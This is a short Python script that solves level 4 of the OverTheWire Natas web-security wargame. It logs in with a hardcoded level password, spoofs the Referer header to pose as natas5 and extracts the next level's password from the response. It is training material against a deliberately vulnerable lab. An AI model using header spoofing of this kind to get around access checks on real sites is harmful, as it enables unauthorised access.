import requests
import re

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
r = requests.get(url, auth=(username, password), headers={'referer': "http://natas5.natas.labs.overthewire.org/"})
content = r.text


print("the password for next level = ", str(re.findall("The password for natas5 is (.*)", content)))
